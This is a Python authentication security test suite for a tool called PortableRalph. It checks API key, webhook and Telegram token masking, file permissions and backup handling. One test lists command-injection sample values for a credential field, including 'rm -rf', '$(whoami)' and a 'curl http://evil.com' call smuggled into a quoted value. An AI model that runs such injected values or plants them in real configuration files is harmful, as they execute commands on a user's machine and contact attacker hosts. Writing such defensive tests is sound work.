#!/usr/bin/env python3
"""
Authentication Security Tests for PortableRalph
Tests API key handling, webhook authentication, and credential management
"""

import subprocess
import tempfile
import os
import sys
import json
import time
import base64
from pathlib import Path
import hashlib
import hmac

# Add repo root to path to import test utilities
REPO_ROOT = Path(__file__).parent.parent.parent
sys.path.insert(0, str(REPO_ROOT))

class AuthenticationTests:
    def __init__(self):
        self.repo_root = REPO_ROOT
        self.test_dir = None
        self.results = []
        self.failed_tests = 0
        self.total_tests = 0

    def setup(self):
        """Setup test environment"""
        self.test_dir = tempfile.mkdtemp(prefix="ralph_auth_test_")
        os.environ['HOME'] = self.test_dir
        return self.test_dir

    def teardown(self):
        """Cleanup test environment"""
        if self.test_dir and os.path.exists(self.test_dir):
            subprocess.run(['rm', '-rf', self.test_dir], check=False)

    def run_test(self, test_name, test_func):
        """Run a single test and record results"""
        self.total_tests += 1
        try:
            test_func()
            self.results.append(f"✅ {test_name}: PASS")
            print(f"✅ {test_name}: PASS")
        except Exception as e:
            self.failed_tests += 1
            self.results.append(f"❌ {test_name}: FAIL - {str(e)}")
            print(f"❌ {test_name}: FAIL - {str(e)}")

    def test_claude_api_key_handling(self):
        """Test Claude API key security and validation"""
        config_file = os.path.join(self.test_dir, ".ralph.env")
        
        # Test with various API key formats
        test_keys = [
            "",  # Empty key
            "invalid_key",  # Invalid format
            "sk-ant-api03-" + "x" * 64,  # Fake but valid format
            "sk-ant-api03-" + "a" * 64 + "-" + "b" * 32 + "AA",  # Valid format
        ]

        for api_key in test_keys:
            with open(config_file, 'w') as f:
                if api_key:
                    f.write(f'export CLAUDE_API_KEY="{api_key}"\n')
            os.chmod(config_file, 0o600)

            # Try to use the API key
            result = subprocess.run([
                'bash', '-c',
                f'cd {self.repo_root} && source {config_file} && echo $CLAUDE_API_KEY | wc -c'
            ], capture_output=True, text=True, timeout=5)

            # Check that API key is not leaked in process list
            ps_result = subprocess.run([
                'ps', 'aux'
            ], capture_output=True, text=True)

            # Should not find API key in process list
            if api_key and len(api_key) > 10 and api_key in ps_result.stdout:
                raise Exception(f"API key leaked in process list: {api_key[:20]}...")

    def test_webhook_url_authentication(self):
        """Test webhook URL security and token protection"""
        config_file = os.path.join(self.test_dir, ".ralph.env")
        
        # Test webhook URLs with different authentication patterns
        test_webhooks = [
            "https://hooks.slack.com/services/T123/B123/token123",
            "https://discord.com/api/webhooks/123/token456",
            "https://api.telegram.org/bot123:token456/sendMessage"
        ]

        for webhook_url in test_webhooks:
            with open(config_file, 'w') as f:
                f.write(f'export RALPH_SLACK_WEBHOOK_URL="{webhook_url}"\n')
            os.chmod(config_file, 0o600)

            # Test notification sending (dry run)
            result = subprocess.run([
                'bash', '-c',
                f'cd {self.repo_root} && export RALPH_DRY_RUN=1 && HOME={self.test_dir} ./notify.sh "test message"'
            ], capture_output=True, text=True, timeout=10)

            # Check that webhook URL is properly masked in logs
            output = result.stdout + result.stderr
            
            # Extract potential token from URL
            if '/services/' in webhook_url:
                # Slack format: extract token after /services/
                token_part = webhook_url.split('/services/')[1]
                if '/' in token_part:
                    potential_tokens = token_part.split('/')
                    for token in potential_tokens:
                        if len(token) > 10 and token in output:
                            raise Exception(f"Webhook token exposed in output: {token}")
            
            elif '/webhooks/' in webhook_url:
                # Discord format: extract token after second /
                parts = webhook_url.split('/webhooks/')[1].split('/')
                if len(parts) > 1:
                    token = parts[1]
                    if len(token) > 10 and token in output:
                        raise Exception(f"Webhook token exposed in output: {token}")

    def test_telegram_bot_token_security(self):
        """Test Telegram bot token handling and security"""
        config_file = os.path.join(self.test_dir, ".ralph.env")
        
        # Test with various Telegram bot token formats
        test_tokens = [
            "123456789:AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPqq",
            "111222333:AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPP-qq",
            "invalid_token",
            ""
        ]

        for bot_token in test_tokens:
            with open(config_file, 'w') as f:
                if bot_token:
                    f.write(f'export RALPH_TELEGRAM_BOT_TOKEN="{bot_token}"\n')
                f.write('export RALPH_TELEGRAM_CHAT_ID="123456"\n')
            os.chmod(config_file, 0o600)

            # Test notification
            result = subprocess.run([
                'bash', '-c',
                f'cd {self.repo_root} && export RALPH_DRY_RUN=1 && HOME={self.test_dir} ./notify.sh "test"'
            ], capture_output=True, text=True, timeout=10)

            # Check token masking in output
            output = result.stdout + result.stderr
            if bot_token and len(bot_token) > 20:
                # Token should be masked, not shown in full
                if bot_token in output:
                    raise Exception(f"Telegram bot token exposed in output")
                
                # Should show masked version
                token_parts = bot_token.split(':')
                if len(token_parts) == 2:
                    secret_part = token_parts[1]
                    if len(secret_part) > 10 and secret_part in output:
                        raise Exception(f"Telegram token secret exposed: {secret_part}")

    def test_encrypted_credential_storage(self):
        """Test encrypted credential storage functionality"""
        config_file = os.path.join(self.test_dir, ".ralph.env")
        
        # Test with encrypted credentials (if supported)
        with open(config_file, 'w') as f:
            f.write('export RALPH_SLACK_WEBHOOK_URL="ENC:encrypted_webhook_url_here"\n')
            f.write('export CLAUDE_API_KEY="ENC:encrypted_api_key_here"\n')
        os.chmod(config_file, 0o600)

        # Test decryption (if decrypt-env script exists)
        decrypt_script = self.repo_root / "decrypt-env.sh"
        if decrypt_script.exists():
            result = subprocess.run([
                str(decrypt_script), config_file
            ], capture_output=True, text=True, timeout=10, cwd=self.test_dir)

            # Should handle encrypted credentials appropriately
            # (exact behavior depends on implementation)
            if result.returncode == 0:
                # Decryption succeeded - check output doesn't leak keys
                output = result.stdout + result.stderr
                if "encrypted_webhook_url_here" in output:
                    raise Exception("Encrypted credential exposed in decryption output")

    def test_api_key_validation(self):
        """Test API key format validation and strength"""
        config_file = os.path.join(self.test_dir, ".ralph.env")
        
        # Test various API key formats
        invalid_keys = [
            "weak",                    # Too short
            "sk-ant-api01-weak",       # Wrong version
            "not-claude-key",          # Wrong format
            "sk-ant-api03-" + "a" * 10,  # Too short
        ]

        valid_keys = [
            "sk-ant-api03-" + "a" * 64 + "-" + "b" * 32 + "AA",  # Valid format
        ]

        # Test invalid keys
        for api_key in invalid_keys:
            with open(config_file, 'w') as f:
                f.write(f'export CLAUDE_API_KEY="{api_key}"\n')
            os.chmod(config_file, 0o600)

            # Validation should happen if implemented
            if (self.repo_root / "lib" / "validation.sh").exists():
                result = subprocess.run([
                    'bash', '-c',
                    f'cd {self.repo_root} && source lib/validation.sh && validate_claude_api_key "{api_key}"'
                ], capture_output=True, text=True, timeout=5)

                # Invalid keys should be rejected (if validation exists)
                if result.returncode == 0:
                    # If validation passes, that's concerning for invalid keys
                    print(f"⚠️  Warning: Invalid API key accepted: {api_key[:20]}...")

    def test_credential_rotation_detection(self):
        """Test detection of credential rotation needs"""
        config_file = os.path.join(self.test_dir, ".ralph.env")
        
        # Create old config file (simulate aging)
        with open(config_file, 'w') as f:
            f.write('export RALPH_SLACK_WEBHOOK_URL="https://hooks.slack.com/services/OLD/OLD/OLD"\n')
            f.write('export CLAUDE_API_KEY="sk-ant-api03-old-key"\n')
        os.chmod(config_file, 0o600)

        # Set old timestamp (if possible)
        old_time = time.time() - (90 * 24 * 60 * 60)  # 90 days ago
        os.utime(config_file, (old_time, old_time))

        # Check if there's rotation detection
        result = subprocess.run([
            'bash', '-c',
            f'cd {self.repo_root} && find {self.test_dir} -name ".ralph.env" -mtime +30'
        ], capture_output=True, text=True)

        if result.stdout.strip():
            print("⚠️  Warning: Old credential file detected (>30 days) - consider rotation")

    def test_multi_factor_authentication_support(self):
        """Test if MFA/additional auth factors are supported"""
        config_file = os.path.join(self.test_dir, ".ralph.env")
        
        # Test with various auth configurations
        with open(config_file, 'w') as f:
            f.write('export CLAUDE_API_KEY="sk-ant-api03-test-key"\n')
            f.write('export RALPH_MFA_REQUIRED="true"\n')
            f.write('export RALPH_AUTH_TOKEN="additional_token"\n')
        os.chmod(config_file, 0o600)

        # Check if MFA is implemented
        result = subprocess.run([
            'bash', '-c',
            f'cd {self.repo_root} && grep -r "MFA\|2FA\|TOTP" . --exclude-dir=.git --exclude-dir=tests || true'
        ], capture_output=True, text=True)

        if result.stdout.strip():
            print("✅ Found MFA references - good security practice")
        else:
            print("⚠️  No MFA implementation detected")

    def test_session_token_handling(self):
        """Test session token security (if applicable)"""
        # PortableRalph may not have traditional sessions, but test what exists
        config_file = os.path.join(self.test_dir, ".ralph.env")
        
        with open(config_file, 'w') as f:
            f.write('export RALPH_SESSION_TOKEN="test_session_123"\n')
        os.chmod(config_file, 0o600)

        # Check that session tokens are handled securely
        result = subprocess.run([
            'bash', '-c',
            f'cd {self.repo_root} && source {config_file} && env | grep SESSION || true'
        ], capture_output=True, text=True)

        # Session tokens should not appear in process environment dumps
        if "test_session_123" in result.stdout:
            print("⚠️  Warning: Session token visible in environment")

    def test_credential_injection_attacks(self):
        """Test protection against credential injection attacks"""
        config_file = os.path.join(self.test_dir, ".ralph.env")
        
        # Test with malicious credential values
        malicious_creds = [
            "valid_key; rm -rf /tmp/test",
            "valid_key$(whoami)",
            "valid_key`whoami`",
            'valid_key"; curl http://evil.com; echo "',
            "valid_key\nmalicious_line=injected"
        ]

        for malicious_cred in malicious_creds:
            with open(config_file, 'w') as f:
                f.write(f'export CLAUDE_API_KEY="{malicious_cred}"\n')
            os.chmod(config_file, 0o600)

            # Test loading the configuration
            result = subprocess.run([
                'bash', '-c',
                f'cd {self.repo_root} && source {config_file} && echo "Config loaded"'
            ], capture_output=True, text=True, timeout=5)

            # Check for command execution artifacts
            if os.path.exists("/tmp/test"):
                raise Exception("Command injection successful via credential")
            
            # Check output for injection artifacts
            output = result.stdout + result.stderr
            if "malicious_line=injected" in output:
                raise Exception("Configuration injection successful")

    def test_credential_backup_security(self):
        """Test security of credential backups"""
        config_file = os.path.join(self.test_dir, ".ralph.env")
        
        # Create config with credentials
        with open(config_file, 'w') as f:
            f.write('export CLAUDE_API_KEY="secret_key_123"\n')
            f.write('export RALPH_SLACK_WEBHOOK_URL="https://hooks.slack.com/secret"\n')
        os.chmod(config_file, 0o600)

        # Simulate backup creation
        backup_file = config_file + ".backup"
        subprocess.run(['cp', config_file, backup_file])

        # Check backup permissions
        import stat
        backup_stat = os.stat(backup_file)
        backup_mode = backup_stat.st_mode

        # Backup should have secure permissions
        if backup_mode & stat.S_IROTH or backup_mode & stat.S_IRGRP:
            raise Exception("Credential backup file has insecure permissions")

        # Check for unencrypted credential backups
        result = subprocess.run([
            'find', self.test_dir, '-name', '*.backup', '-exec', 'grep', '-l', 'secret_key', '{}', ';'
        ], capture_output=True, text=True)

        if result.stdout.strip():
            print("⚠️  Warning: Unencrypted credential backups found")

    def run_all_tests(self):
        """Run all authentication security tests"""
        print("🔒 Running Authentication Security Tests for PortableRalph\n")
        
        try:
            self.setup()
            
            # Run all test methods
            self.run_test("Claude API Key Handling", self.test_claude_api_key_handling)
            self.run_test("Webhook URL Authentication", self.test_webhook_url_authentication)
            self.run_test("Telegram Bot Token Security", self.test_telegram_bot_token_security)
            self.run_test("Encrypted Credential Storage", self.test_encrypted_credential_storage)
            self.run_test("API Key Validation", self.test_api_key_validation)
            self.run_test("Credential Rotation Detection", self.test_credential_rotation_detection)
            self.run_test("Multi-Factor Auth Support", self.test_multi_factor_authentication_support)
            self.run_test("Session Token Handling", self.test_session_token_handling)
            self.run_test("Credential Injection Protection", self.test_credential_injection_attacks)
            self.run_test("Credential Backup Security", self.test_credential_backup_security)

        finally:
            self.teardown()

        # Print summary
        print(f"\n{'='*60}")
        print("AUTHENTICATION SECURITY TEST SUMMARY")
        print(f"{'='*60}")
        print(f"Total Tests: {self.total_tests}")
        print(f"Passed: {self.total_tests - self.failed_tests}")
        print(f"Failed: {self.failed_tests}")
        
        if self.failed_tests == 0:
            print("🎉 All authentication security tests passed!")
            return True
        else:
            print(f"⚠️  {self.failed_tests} authentication security issues found!")
            return False

if __name__ == "__main__":
    test_suite = AuthenticationTests()
    success = test_suite.run_all_tests()
    sys.exit(0 if success else 1)